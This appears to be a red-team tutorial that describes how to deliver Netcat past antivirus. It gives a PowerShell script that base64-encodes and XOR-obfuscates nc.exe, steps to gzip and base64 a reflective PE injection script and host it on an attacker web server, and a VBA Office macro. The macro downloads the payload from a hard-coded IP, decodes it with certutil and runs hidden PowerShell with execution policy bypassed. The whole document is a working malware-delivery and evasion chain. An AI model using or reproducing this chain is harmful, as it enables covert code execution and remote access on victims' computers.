## XORed Netcat

```
function Convert-BinaryToString {
    [CmdletBinding()] param (
        [string] $FilePath
    )
    try {
    $ByteArray = [System.IO.File]::ReadAllBytes($FilePath);
    }
    catch {
        throw "Failed to read file.";
    }
    if ($ByteArray) {
        $Base64String = [System.Convert]::ToBase64String($ByteArray);
    }
    else {
        throw '$ByteArray is $null.';
    }
    Write-Output -InputObject $Base64String;
}

Convert-BinaryToString "c:\users\hassan.saad\desktop\extreme\nc.exe" > nc_base64.txt
(Get-Content -path "c:\users\hassan.saad\desktop\extreme\nc_base64.txt" -Raw) -replace 'A','Z' > key.txt

$file1_b = [System.IO.File]::ReadAllBytes("c:\users\hassan.saad\desktop\extreme\nc_base64.txt")
$file2_b = [System.IO.File]::ReadAllBytes("c:\users\hassan.saad\desktop\extreme\key.txt")
$out = "c:\users\hassan.saad\desktop\extreme\ciphered.txt"

$len = if ($file1_b.Count -lt $file2_b.Count) {$file1_b.Count} else { $file2_b.Count}
$xord_byte_array = New-Object Byte[] $len
# XOR between the files
for($i=0; $i -lt $len ; $i++) {
    $xord_byte_array[$i] = $file1_b[$i] -bxor $file2_b[$i] }
[System.IO.File]::WriteAllBytes("$out", $xord_byte_array)
write-host "[*] $file1 XOR $file2`n[*] Saved to " -nonewline;
Write-host "$out" -foregroundcolor yellow -nonewline; Write-host ".";
```

Then host the ciphered text and the key on your own web server.

Then use the PEInject.ps1 script and replace the URLs with your own web server.

The PEInject.ps1 script will reverse what XORed Netcat does then inject Netcat into powershell process.

# PEInject.ps1 Obfuscation

Then compress PEInject.ps1 script using https://www.multiutil.com/text-to-gzip-compress/ and put the output into the below script.

```
$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('insert_gzip_compressed_Invoke-ReflectivePEInjection'));
IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()
```

Then Base64 the above script using https://www.base64encode.org/ .

Then also host the obfuscated PEInject script on your own web server, then use the following macro code to download the file then decoded and executed.

## Macro Code VBA

```
Sub DownloadFileFromURL()

Dim FileUrl As String
Dim objXmlHttpReq As Object
Dim objStream As Object

FileUrl = "http://192.168.43.207:8000/ps1.crt"

Set objXmlHttpReq = CreateObject("Microsoft.XMLHTTP")

objXmlHttpReq.Open "GET", FileUrl, False, "username", "password"
objXmlHttpReq.send

If objXmlHttpReq.Status = 200 Then
Set objStream = CreateObject("ADODB.Stream")

ChDir ActiveWorkbook.Path

objStream.Open
objStream.Type = 1
objStream.Write objXmlHttpReq.responseBody
objStream.SaveToFile CurDir() & "\file.crt", 2
objStream.Close

End If

Shell ("cmd /c certutil -decode file.crt decoded.ps1 & c:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -exec bypass -W Hidden .\decoded.ps1")

End Sub
```
